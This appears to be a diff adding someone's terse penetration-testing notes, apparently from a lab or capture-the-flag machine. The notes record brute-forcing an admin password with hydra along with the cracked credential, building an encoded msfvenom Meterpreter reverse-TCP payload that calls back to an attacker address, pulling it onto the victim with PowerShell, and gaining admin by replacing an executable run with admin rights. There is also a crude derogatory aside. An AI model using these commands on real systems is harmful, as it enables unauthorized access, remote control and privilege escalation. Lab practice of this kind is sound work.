@@ -1,0 +1,21 @@
+------------------
+NOTES
+------------------
+
+------------------
+PROCESS
+------------------
+
+brute force the admin password with hydra (GAY)
+	admin:1qaz2wsx
+
+using meterpreter
+	create a msfvenom payload
+		msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.31.29 LPORT=9001 -f exe -o shell.exe
+
+	upload the shell to the victim
+		powershell Invoke-WebRequest -Uri http://10.13.31.29:8080/shell.exe -Outfile shell.exe
+
+	create a handler on the attacker
+
+message.exe is ran as admin, can replace with a shell and get admin
